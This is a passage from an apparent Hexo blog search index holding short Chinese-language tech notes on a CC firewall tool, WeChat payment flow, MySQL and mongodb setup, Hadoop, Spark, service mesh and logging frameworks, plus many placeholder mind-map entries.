&quot;reg.gyyx.cn/Login/Async&quot;: { //URL &quot;threshold_w_secound&quot;: &quot;100&quot;, //警告阈值秒数 &quot;threshold_secound&quot;: &quot;300&quot;, //封停阈值秒数 &quot;block_second&quot;: &quot;86400&quot; //封停秒数 } } } 数据库模型 Agent启动Agent python CCFirewall.py 本机IP 前端左上方可以设置防火前的配置，保存后实时生效，中上方可以查看当前已经上线的客户端，点击详情可以看到此客户端已经封停的IP格式，右上方可以看到曲线，地图，已经两个计数器信息 左下方显示最新的达到计数器的条目，右下方可以看到异常IP在客户端的封锁状况。]]></content>
      <categories>
        <category>github</category>
      </categories>
      <tags>
        <tag>项目推荐</tag>
        <tag>防火墙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信H5支付]]></title>
    <url>%2F2018%2F06%2F30%2Fessay%2Fweichat-h5-pay%2F</url>
    <content type="text"><![CDATA[微信支付流程 微信支付流程 大概就是这个样子、也包括支付宝、各大银联差不多一个流程、也就是传递的参数略有不同 用户通过客户端下一个订单、 后台根据用户下的商品来生成一个订单、 然后可以有一个订单确认页面 以显示订单是否完整 之后确认订单、把订单信息发送给微信 生成预支付信息【订单需要支付了、我告诉微信一下、我这有个订单要用你的支付了】 之后用微信返回的预支付信息来调起微信支付【微信表示我收到了、我给你个密钥、你用它去找我的管家要钱就行了】 用户输入密码、确认支付【用户拿着密钥找管家、我要买这个、这是我的账户密码】 支付完成、微信告诉客户端的服务器、他买完了、并且成功了、【微信大佬告诉你后台”也就是你老婆”你丈夫在我这买了个这个】 核心部分是这么个流程 当然 再接入微信支付前 要判断你对这个网站的拥有权需要在你的服务器 上传一个文件作为验证、这个跟站长在百度等各大搜索引擎验证身份一个意思 还要配置 回调地址 以防止数据被篡改、保证安全性、 对于服务之间的通信全程都是https加密类型-混合型加密技术]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL经典架构]]></title>
    <url>%2F2018%2F06%2F29%2Fmysql%2Fmysql-solution%2F</url>
    <content type="text"><![CDATA[mysql主从复制 此种架构，一般初创企业比较常用，也便于后面步步的扩展 此架构特点： 1、成本低，布署快速、方便 2、读写分离 3、还能通过及时增加从库来减少读库压力 4、主库单点故障 5、数据一致性问题（同步延迟造成） MySQL+MMM架构 通过 DRBD 基于 block 块的复制模式，快速进行双主故障切换，很大程度上解决主库单点故障问题 此架构特点： 1、高可用软件可使用 Heartbeat, 全面负责 VIP、数据与 DRBD 服务的管理 2、主故障后可自动快速切换，并且从库仍然能通过 VIP 与新主库进行数据同步 3、从库也支持读写分离，可使用中间件或程序实现 MySQL+DRDB架构 MHA 目前在 Mysql 高可用方案中应该也是比较成熟和常见的方案，它由日本人开发出来，在 mysql 故障切换过程中，MHA 能做到快速自动切换操作，而且还能最大限度保持数据的一致性 此架构特点： 1、安装布署简单，不影响现有架构 2、自动监控和故障转移 3、保障数据一致性 4、故障切换方式可使用手动或自动多向选择 5、适应范围大（适用任何存储引擎） MySQL+MHA架构 MMM 即 Master-Master Replication Manager for MySQL（mysql 主主复制管理器），是关于 mysql 主主复制配置的监控、故障转移和管理的一套可伸缩的脚本套件（在任何时候只有一个节点可以被写入），这个套件也能基于标准的主从配置的任意数量的从服务器进行读负载均衡，所以你可以用它来在一组居于复制的服务器启动虚拟 ip，除此之外，它还有实现数据备份、节点之间重新同步功能的脚本。MySQL 本身没有提供 replication failover 的解决方案，通过 MMM 方案能实现服务器的故障转移，从而实现 mysql 的高可用。 此方案特点： 1、安全、稳定性较高，可扩展性好 2、 对服务器数量要求至少三台及以上 3、 对双主（主从复制性要求较高） 4、 同样可实现读写分离]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[语音交互]]></title>
    <url>%2F2018%2F06%2F29%2Fai%2Fyuyin-001%2F</url>
    <content type="text"><![CDATA[语音交互发展史 语音交互简介 语音合成【在线、离线】 语音识别【听写、转写、唤醒】 语义理解【AIUI】 语音识别模块【麦克风阵列、语音合成芯片、离线识别模块】 模式识别【人脸识别、声纹识别】 语音扩展【语音测评、机器翻译】 语音交互应用场景 导航 智能设备 语音交互组件 AI]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>语音交互</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[atom 快捷键]]></title>
    <url>%2F2018%2F06%2F28%2Fessay%2Fatom%2F</url>
    <content type="text"><![CDATA[英文 中文 快捷键 New Window 新建界面窗口 Ctrl + Shift + N 如中文意思 New File 新建文件 Ctrl + N 如中文意思 Open File 打开文件 Ctrl + O 如中文意思 Open Folder 打开文件夹 Ctrl + Shift + O 如中文意思 Add Project Folder 加载项目目录 Ctrl + Alt + O 如中文意思 Reopen Last Item 重新加载上次项目 Ctrl + Shift + T 如中文意思 Save 保存文件 Ctrl + S 如中文意思 Save As 另存为 Ctrl + Shift +S 如中文意思 Close Tab 关闭当前编辑文档 Ctrl + W 如中文意思 Close Window 关闭编辑器 Ctrl + Shift + W 如中文意思 Undo 撤销 Ctrl + Z 如中文意思 Redo 重做 Ctrl + Y 如中文意思 Cut 剪切 Shift + Delete 如中文意思 Copy 复制 Ctrl + Insert 如中文意思 Copy Path 复制文档路径 Ctrl + Shift + C 如中文意思 Paste 粘贴 Shift + Insert 如中文意思 Select All 全选 Ctrl + A 如中文意思 Select Encoding 选择编码 Ctrl + Shift +U 就是设置文件的编码 Go to Line 跳转到某行 Ctrl + G 支持行列搜索,Row:Column Slect Grammar 语法选择 Ctrl + Shift + L 和Sublime的Syntax设置功能一样 Reload 重载 Ctrl+ Alt +R 重新载入当前编辑的文档 Toggle Full Screen 全屏 F11 如中文意思 Increase Font Size 增大字体 Ctrl + Shift + “+” Sublime的Ctrl + 也能生效 Decrease Font Size 减小字体 Ctrl + Shift + “-“ Sublime的Ctrl - 也能生效 Toggle Tree View 展示隐藏目录树 Ctrl + （竖杠） Ctrl+b可以隐藏不能展示 Toggle Commadn palette 全局搜索面板 Ctrl + Shift + P 和Sublime的大同小异 Select Line 选定一行 Ctrl + L 如中文意思 Select First Character of Line 选定光标至行首 Shift + Home 如中文意思 Slect End of Line 选定光标至行尾 Shift + End 如中文意思 Select to Top 选定光标处至文档首行 Ctrl + Shift + Home 就是光标处作为分割线,取文档上部分 Select to Bottom 选定光标处至文档尾行 Ctrl + Shfit + End 就是光标处作为分割线,取文档下部分 Find in Buffer 从缓存器搜索 Ctrl + F 与Sublime一致 Replace in Buffer 高级替换 Ctrl + Shift + F 与Sublime一致 Select Next 匹配选定下一个 Ctrl + D 和Sublime一模一样有木有 Select All 匹配选定所有 Alt + F3 和Sublime一模一样有木有 Find File 查询文件,选定打开 Ctrl + P 与Sublime不一样 Delte End of Word 删除光标处至词尾 Ctrl + Del 如中文意思 Duplicate Line 复制行 Ctrl + Shift + D 复制光标所在行自动换行 Delete Line 删除一行 Ctrl + Shift + K 如中文意思 Toggle Comment 启用注释 Ctrl + / 与Sublime一致 Toggle developer tools 打开Chrome调试器 Ctrl + Alt + I 挺神奇的 Indent 增加缩进 Ctrl + [ 向右缩进 Outdent 减少缩进 Ctrl + ] 向左缩进 Move Line Up 行向上移动 Ctrl + up 如字面意思 Move Line Down 行向下移动 Ctrl + Down 如字面意思 Join Lines 行链接 Ctrl + J 追加 newline-below 光标之下增加一行 Ctrl + Enter 与sublime 一致 editor:newline-above 光标之上增加一行 Ctrl + Shift + Enter 与sublime 一致 pane:show-next-item 切换编辑的标签页 Ctrl + Tab 如中文意思 Fuzzy Finder 文件跳转面板 Ctrl + T 如字面意思 Select Line Move above 选中行上移 Ctrl + up 如中文意思 Select Line Move below 选中行下移 Ctrl + down 如中文意思 Symbol-view 进入变量、函数跳转面板。 Ctrl + R 如中文意思]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的技术图谱]]></title>
    <url>%2F2018%2F06%2F24%2Fessay%2Fessay-9%2F</url>
    <content type="text"><![CDATA[此技术图谱个人技术内容绘制包含内容java后台常见技术栈 图谱分类 描述内容 DB 数据库、mysql 事务 java事务、分布式事务、db事务 分布式 常见分布式架构 协议 常见协议 各大开源组件解析 dubbo、data-es 密码加密 密码加密发展史、破解史 搜索引擎 es搜索引擎 权限 shiro 、数据权限、oauth认证 消息中间件 kafka、rocketmq、rabbitmq、zeromq 算法 常见排序算法、分布式算法、缓存算法、一致性算法 线程 java线程 缓存 缓存组件 设计模式 java设计模式 负载均衡 分布式流量负载 锁 java锁、分布式锁]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[智能合约 简介]]></title>
    <url>%2F2018%2F06%2F23%2Fblock-chain%2Fblock-chain-1%2F</url>
    <content type="text"><![CDATA[智能合约发展史 区块链发展 智能合约简介 智能合约是“执行合约条款的计算机交易协议”。 [3] 区块链上的所有用户都可以看到基于区块链的智能合约。但是，这会导致包括安全漏洞在内的所有漏洞都可见，并且可能无法迅速修复。 [4]这样的攻击难以迅速解决，例如，2016年6月The DAOEther的漏洞造成损失5000万美元，而开发者试图达成共识的解决方案。 [5] DAO的程序在黑客删除资金之前有一段时间的延迟。以太坊软件的一个硬分叉在时限到期之前完成了攻击者的资金回收工作。 [6]以太坊智能合约中的问题包括合约编程Solidity、编译器错误、以太坊虚拟机错误、对区块链网络的攻击、程序错误的不变性以及其他尚无文档记录的攻击。[7] 智能合约应用场景 智慧链：通证token经济设计、 以太坊智能合约 区块链技术 智能合约审计 智能合约组件 连接物联网必要组成部分 智能合约集群 区块链技术]]></content>
      <categories>
        <category>block-chain</category>
      </categories>
      <tags>
        <tag>智能合约</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spark 简介]]></title>
    <url>%2F2018%2F06%2F20%2Fbig-data%2Fspark%2Fspark-1%2F</url>
    <content type="text"><![CDATA[spark发展史 Apache Spark Spark Logo 开发者 Apache软件基金会, 加州大学柏克莱分校AMPLab, Databricks 稳定版本 2.1.0 （2016年12月28日 ） 开发状态 活跃 编程语言 Scala, Java, Python 操作系统 Linux, Mac OS, Microsoft Windows 类型 数据分析, 机器学习算法 许可协议 Apache许可协议 2.0 网站 spark.apache.org 源代码库 github.com/apache/spark Apache Spark是一个开源集群运算框架，最初是由加州大学柏克莱分校AMPLab所开发。 相对于Hadoop的MapReduce会在运行完工作后将中介数据存放到磁盘中，Spark使用了存储器内运算技术，能在数据尚未写入硬盘时即在存储器内分析运算。 Spark在存储器内运行程序的运算速度能做到比Hadoop MapReduce的运算速度快上100倍，即便是运行程序于硬盘时，Spark也能快上10倍速度。 [1]Spark允许用户将数据加载至集群存储器，并多次对其进行查询，非常适合用于机器学习算法。 spark简介 spark应用场景 使用Spark需要搭配集群管理员和分布式存储系统。 Spark支持独立模式（本地Spark集群）、Hadoop YARN或Apache Mesos的集群管理。 [3] 在分布式存储方面，Spark可以和HDFS[4]、 Cassandra[5] 、OpenStack Swift和Amazon S3等接口搭载。 Spark也支持伪分布式（pseudo-distributed）本地模式，不过通常只用于开发或测试时以本机文件系统取代分布式存储系统。 在这样的情况下，Spark仅在一台机器上使用每个CPU核心运行程序。 spark组件 Spark核心是整个项目的基础，提供了分布式任务调度，调度和基本的I／O功能。而其基础的程序抽象则称为弹性分布式数据集（RDDs），是一个可以并行操作、有容错机制的数据集合。 RDDs可以通过引用外部存储系统的数据集创建（例如：共享文件系统、HDFS、HBase或其他 Hadoop 数据格式的数据源）。 或者是通过在现有RDDs的转换而创建（比如：map、filter、reduce、join等等）。 RDD抽象化是经由一个以Scala, Java, Python的语言集成API所呈现，简化了编程复杂性，应用程序操纵RDDs的方法类似于操纵本地端的数据集合。 spark集群]]></content>
      <categories>
        <category>big-data</category>
      </categories>
      <tags>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hadoop 简介]]></title>
    <url>%2F2018%2F06%2F20%2Fbig-data%2Fhadoop%2Fhadoop-1%2F</url>
    <content type="text"><![CDATA[hadoop发展史 Hadoop Apache Lucene创始人Doug Cutting 创建 基于 Nutch开发 本身也是lucence一部分 2004年 Doug Cutting 和Mike Cafarella 实现 HDFS和MapReduce初版 2005年 Nutch移植到新框架 Hadoop再20个节点稳定运行 2006年1月 Doug Cutting 加入雅虎 2006年2月 Apache Hadoop项目正式启动、支持MapReduce和HDFS独立发展 2006年4月 再188节点上（每节点10GB数据）运行排序测试集群需要47.9小时 2006年5月 雅虎建立一个300个节点的Hadoop研究集群 2006年5月 在500个节点运行排序测试集需要42个小时（硬件配置比四月份更优秀） 2006年11月 研究集群增加到600个节点 2006年12月 排序测试集在20个节点上运行1.8个小时、100个节点运行3.3个小时、500个节点运行5.2小时、900个节点需要7.8个小时。 2007年1月 研究集群增加到900个节点 2007年4月 研究集群增加到两个集群1000个节点 2008年4月 在900个节点上运行1TB排序测试集仅需要209秒 2008年10月 研究集群每天装载10TB数据 2009年3月 17个集群共24000个节点 2009年4月 在每分钟排序中胜出、59秒排序500GB（在1400个节点）、173分钟排序100TB数据（在3400节点） hadoop简介 大数据处理、应对数据处理出现的新的技术、 底层也就是大名鼎鼎的HDFS文件系统 对数据并发处理有极强的性能 hadoop-wiki hadoop应用场景 随着数据量的增大、数据量已经到了PB级别、数据的存储也需要更加强大的技术来支持、 hadoop组件 namenode节点负责存储目录 datanode节点负责存储数据 Map函数 接受一个键值对（key-value pair），产生一组中间键值对。 MapReduce框架会将map函数产生的中间键值对里键相同的值传递给一个reduce函数。 Reduce函数 接受一个键，以及相关的一组值，将这组值进行合并产生一组规模更小的值（通常只有一个或零个值）。 hadoop集群 namenode节点的可靠性 datanode节点的可靠性 让我想到了rocketmq nameserver负责存储消息路由订阅消息id 相当于菜单、 broker负责存储消息 相当于菜单下的数据 然后namenode节点的数据统一性？ paxos算法？ 当然其中会有很多消息的同步刷新异步刷新、消息节点重建、 怎么保证消息的完整性、怎么保证消息不丢失、怎么排序数据可执行性 很多东西、都是一样的、实现方式都是一个东西、也就是实现的代码可能会不同而已 hadoop 开发思想 分而治之、大任务拆分小任务执行 数据：分片存储、并发调度、结果综合查询 Job&amp;task、Job&amp;Tracker、Task&amp;Tracker Job&amp;task 任务执行 Job&amp;Tracker 作业调度 分配任务、监控任务执行调度 监控taskTracker状态 Task&amp;Tracker 执行任务 汇报任务 容错机制 重复执行 推测执行]]></content>
      <categories>
        <category>big-data</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜索引擎·二 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-search-engine-1%2F</url>
    <content type="text"><![CDATA[nutch 图谱 lucence 图谱 egothor 图谱 lire 图谱 compass 图谱 indextank 图谱 solandra 图谱 solr 图谱 elasticsearch 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[容器 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-container%2F</url>
    <content type="text"><![CDATA[本图谱 描述 docker pouch container kubernetes jetty tomcat 容器 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[各大开源组件解析 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-component%2F</url>
    <content type="text"><![CDATA[spring dubbo lucence spring spring 图谱dubbo 图谱lucence 图谱java 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-algorithm%2F</url>
    <content type="text"><![CDATA[算法 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-distributed%2F</url>
    <content type="text"><![CDATA[分布式 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线程 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-thread%2F</url>
    <content type="text"><![CDATA[线程 图谱 java锁 详细见xmind-锁]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[事务 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-translation%2F</url>
    <content type="text"><![CDATA[事务 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[负载均衡 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-load-balance%2F</url>
    <content type="text"><![CDATA[负载均衡 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DB 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-db%2F</url>
    <content type="text"><![CDATA[mysql 图谱mongodb 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜索引擎·一 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-search-engine-0%2F</url>
    <content type="text"><![CDATA[搜索引擎简介 图谱搜索引擎通用特点 图谱 SEO 图谱 爬虫 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[协议 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-protocol%2F</url>
    <content type="text"><![CDATA[协议 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-permission%2F</url>
    <content type="text"><![CDATA[权限 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓存 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-cache%2F</url>
    <content type="text"><![CDATA[缓存 图谱 memcached 图谱 redis 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[消息中间件 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-message%2F</url>
    <content type="text"><![CDATA[消息中间件特点 图谱rabbitmq 图谱rocketmq 图谱zeromq 图谱kafka 图谱activemq 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-design-model%2F</url>
    <content type="text"><![CDATA[设计模式 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[锁 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-lock%2F</url>
    <content type="text"><![CDATA[锁 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码加密 图谱]]></title>
    <url>%2F2018%2F06%2F12%2Fxmind%2Fxmind-password%2F</url>
    <content type="text"><![CDATA[密码加密 图谱]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>我的图谱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[easy-cloud]]></title>
    <url>%2F2018%2F06%2F09%2Fspring-cloud%2Feasy-cloud%2F</url>
    <content type="text"><![CDATA[总有一件事 是你想做的 代码地址github 1234567891011121314151617add 用户认证请求授权 用户授权返回授权令牌 *第三方请求权限 返回请求令牌 *校验系统是否注册 *校验用户是否存在 保存redis mq落地db *返回授权调用code 一般使用一次 五分钟 *校验用户凭证 本系统分发出去用户确定用户有效唯一凭证 可以是登陆token * 第零 确定system是否有效 * 第一确定code有效 * 第二验证用户token * 第三分配数据访问权限 保存redis mq落地db * 第四 返回 授权令牌 * * 之后第三方系统 携带 系统id 用户账号 以及想访问的资源 向我系统请求数据]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>开源项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb 使用]]></title>
    <url>%2F2018%2F06%2F06%2Fmongodb%2Fmongodb-4%2F</url>
    <content type="text"><![CDATA[mongodb 使用 12345678910111213141516171819202122232425262728293031文档性数据库 针对类型、无格式文档、只根据id、type区分代码 使用封装data-mongodb数据@AutowiredMongoTemplate mongoTemplate;mongoTemplate.save(logDocument);//入参 当前第1页、显示20条数据、搜索类型demo封装类Query query = new Query(); //构造分页请求信息 Sort sort = new Sort(Sort.Direction.DESC,&quot;createTime&quot;); PageRequest pageRequest = new PageRequest(1,20,sort); query.with(pageRequest); query.addCriteria(Criteria.where(&quot;id&quot;).is(demo.getId());mongoTemplate.find(query,LogDocument.class);///指定全文模糊匹配检索 代码片段 用作以后参考 TextCriteria criteria = new TextCriteria(); Map&lt;String,String&gt; map = JsonUtil.beanToMap(demo); for(String string :map.values())&#123; criteria.matching(string); &#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb 命令]]></title>
    <url>%2F2018%2F06%2F06%2Fmongodb%2Fmongodb-3%2F</url>
    <content type="text"><![CDATA[mongodb 命令 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#启动/opt/env/mongodb-3.6.5/bin/mongod --config /etc/mongod.conf--config 加载配置--dbpath 数据存放路径--port 启动端口--fork 以守护方式启动进程 相当于 nohup **** &amp;--logpath 日志路径 --append 追加日志 保留以前日志--directoryperdb 每个数据库单独一个文件夹#数据库操作show dbs;show collections;show users;use &lt;db_name&gt;;//如果存在切换 如果不存在 新建并切换#查看帮助db.help();db.foo.help();db.foo.find();db.foo.find(&#123;a:1&#125;);#查看状态db.status();db.version();#查看当前链接机器地址db.getMongo();db.shutdownServer();#数据操作db.user.find();db.user.findOne();db.user.update();db.user.remove();]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb 集群]]></title>
    <url>%2F2018%2F06%2F06%2Fmongodb%2Fmongodb-2%2F</url>
    <content type="text"><![CDATA[mongodb 配置12345678910111213141516171819202122232425262728293031323334353637383940414243444546# mongod.conf# for documentation of all options, see:# http://docs.mongodb.org/manual/reference/configuration-options/# where to write logging data.systemLog: destination: file logAppend: true #path: /var/log/mongodb/mongod.log path: /opt/env/mongodb-3.6.5/log/mongod.log# Where and how to store data.storage: #dbPath: /var/lib/mongo dbPath: /opt/env/mongodb-3.6.5/data journal: enabled: true# engine:# mmapv1:# wiredTiger:# how the process runsprocessManagement: fork: true # fork and run in background pidFilePath: /var/run/mongodb/mongod.pid # location of pidfile# network interfacesnet: port: 27027 bindIp: 0.0.0.0 # Listen to local interface only, comment to listen on all interfaces.#security:#operationProfiling:#replication:#sharding:## Enterprise-Only Options#auditLog:#snmp: mongodb 集群]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb 简介]]></title>
    <url>%2F2018%2F06%2F06%2Fmongodb%2Fmongodb-1%2F</url>
    <content type="text"><![CDATA[mongodb官方docBSON格式文档型分片存储服务BSON格式 与json类似 优点：解释快 应用点：支持大量存储、数据格式灵活多样、广泛的索引结构、优秀的集群管理缺点：不支持事务、成本高 mongodb 组成部件 1、实际存储服务分片--存储json数据 2、路由 mongos--负责把请求转发到正确的服务器上 3、配置服务器---跟踪服务集群状态 每个组件都是集群服务、即多进程服务、更稳定、预防节点宕机倒是集群gg mongodb 数据结构 与es一样 document文档行数据库 Collections ： 文档集合 document ： 文档 特殊存储 GridFS：因为bson对象的大小有限制，不适合存储大型文件，GridFS文件系统为大型文件提供了存储的方案，GridFS下的fs保存的是图片、视屏等大文件。 mongodb 存储方式 集群 自动扩散是分片存储。 自动检测分片存储数据大小、数据自动流转到空闲节点、对外使用暴露统一服务调用 mongodb 存储引擎 MongoDB支持多个存储引擎 MongoDB 3.2开始的默认存储引擎使用WiredTiger 它非常适合大多数工作负载，建议用于新部署。 WiredTiger提供了文档级并发模型，检查点和压缩等功能。在MongoDB Enterprise中，WiredTiger还支持静态 加密。 3.2之前的MongoDB版本的默认存储引擎 是 MMAPv1。 MMAPv1在具有大量读取和写入以及就地更新的工作量上表现良好。 mongodb 存储索引 Single Field【单字段索引】 Compound Index【复合索引】 Multikey Index【多键索引】 Geospatial Index【地理空间索引】 Text Indexes【文本索引】 Hashed Indexes【hash索引】 Unique Indexes【唯一索引】 Partial Indexes【部分索引、3.2之后新加索引】 索引符合指定过滤器表达式的集合中的文档。 通过索引集合中的文档子集，部分索引的索引创建和维护的存储需求更低，性能成本更低。 部分索引提供了稀疏索引功能的超集，应该优先于稀疏索引。 Sparse Indexes【稀疏索引】 索引仅包含具有索引字段的文档的条目。索引跳过没有索引字段的文档。 TTL Indexes【TTL索引】 TTL索引是一些特殊的索引，MongoDB可以在一段时间后使用它自动从集合中删除文档。这对于某些类型的信息比如机器生成的事件数据，日志和会话信息是理想的，这些信息只需要在有限的时间内保留在数据库中。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[service-mesh简介]]></title>
    <url>%2F2018%2F06%2F04%2Fservice-mesh%2Fservice-mesh-1%2F</url>
    <content type="text"><![CDATA[什么是service-mesh？ 字面理解服务网格 功能：代理服务实现微服务功能、 服务发现 负载均衡 路由 流量控制 通信可靠性 弹性可伸缩 安全 监控以及日志 有人会说 这个为服务网关 不是早就实现了吗？ 答：是，是实现了、但是所有的技术都有取舍、缺陷、 为服务上的网管对服务的侵入太多、太多的网管代理还会使服务变得很臃肿、 作为对外的唯一暴露服务、他的弹性伸缩做的还比较差、需要重启服务网关重新加载服务代理 service-mesh 服务治理做了什么？ 答：服务网格基于docker、kuberments Service Mesh由data plane构成，其中所有服务通过sidecar代理进行服务通信。 （所有代理相互连接形成一个Mesh，Service Mesh由此得名） 网格同时包含一个control plane——可以将所有独立的sidecar代理连接到一个分布式网络中， 并设置网格还包括一个控制平面——它将所有独立的sidecar代理连接到一个分布式网络中， 并设置由data plane指定的策略。 Control plane定义服务发现、路由、流量控制等策略。 这些策略可以是全局的，也可以是限定的。Data plane负责在通信时应用和执行这些策略。 service-mesh 与 spring-cloud service-mesh 是一套全新的服务网格系统、不渗入原有代码 使用代理slipder完成服务代理 请求 spring-cloud spring家族 面对现有组建众多复杂性、打造出一个cloud专版、 理论点：连接一切、集成市场主流应用 两者都是在为微服务做着自己的方向、互不侵犯、互不融合、各有各的目标和愿景 现有体系下 都在上云、很多确实都是在 先上springcloud 再上service-mesh 最起码等待实际生产环境的验证 一种明悟、应用组件这种发展越来越嵌入基础层、所有共性的服务渐渐的由应用层组件转向了计算机网络通信组件、就像tcp、 如果说spring cloud是应用级别的分布式服务控制、那么service mesh是建立在计算机基础服务上的分布式服务控制、 提取了共性的服务注册、服务代理 做出了一套基础计算机服务、专门面向分布式系统的一种基础服务、未来会不会像mysql一样流行、 原文地址 资料地址]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>service-mesh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[日志发展史]]></title>
    <url>%2F2018%2F06%2F04%2Flog%2Flog-total%2F</url>
    <content type="text"><![CDATA[日志总图接口定制组建使用interface标识具体实现组建使用class标识 you must know 从log4j到log4j2.0 logback是log4j升级版 是slf4j完美实现sun出品的接口JUL、后来的commons-logging ceki写的slf4j、logback、log4j、log4j2.0 这人简直神了 日志发展史上重要人物啊 写一个一个规则 现在多数工厂都在用logback 不过想原文讲的log4j2.0 在针对新业务的特性上 有很大提升 log4j特性、也奠定了日志大致方向 1、允许应用记录日志对象、开发不考虑日志输出位置、日志信息以object传递 2、每个logger互相独立 以名字标识区分 3、Appender属性 配置日志输出路径【文件、consoler、DB、MQ、etc】 4、level 定制日志级别输出 logback特性 xml配置方式和grovvy支持 自动重载有变更配置文件 自动压缩日志 打印异常信息自动包含package名称以及版本号 filters 谨慎模式 自动清除旧文档 http访问功能 丰富过滤模式 日志组建发展时间图 slf4j简介slf4j 结构图 使用“{}” 代替参数传输 绑定方式：混合绑定、桥接绑定 混合绑定 两种方式：使用适配器接向底层实现interface 、或者直接实现slf4j 接口 适配器：slf4j+log4j[1.2.17] slf4j+JDK14[1.7.21] 接口实现：logback-classic[1.0.13]、slf4j-simple[1.7.21] slf4j 混合绑定 桥接绑定 针对老项目日志迁移 以slf4j 为接口中间层 将上层旧日志框架的消息转发到底层绑定的新日志框架上. 